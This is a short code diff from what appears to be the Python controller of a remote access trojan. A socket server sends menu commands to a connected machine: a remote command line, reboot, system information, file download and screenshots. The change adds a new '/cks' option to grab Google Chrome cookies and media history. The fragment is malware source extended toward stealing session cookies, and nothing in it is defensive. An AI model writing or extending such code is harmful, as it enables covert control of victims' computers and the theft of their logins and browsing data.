@@ -7,7 +7,7 @@ s.bind((host, port))
 s.listen(1)
 while True:
     conn, addr = s.accept()
-    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/reboot - Restart System\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n> ')
+    a = input('/cmd - Сommand line\n/mkdir - Make directory\n/reboot - Restart System\n/sysinfo - system information\n/dir - (Files, Download)\n/screen - ScreenShot\n/cks - cookies & MediaHistory(Google Chrome)\n> ')
     conn.send(a.encode())
 
     if a == '/cmd':
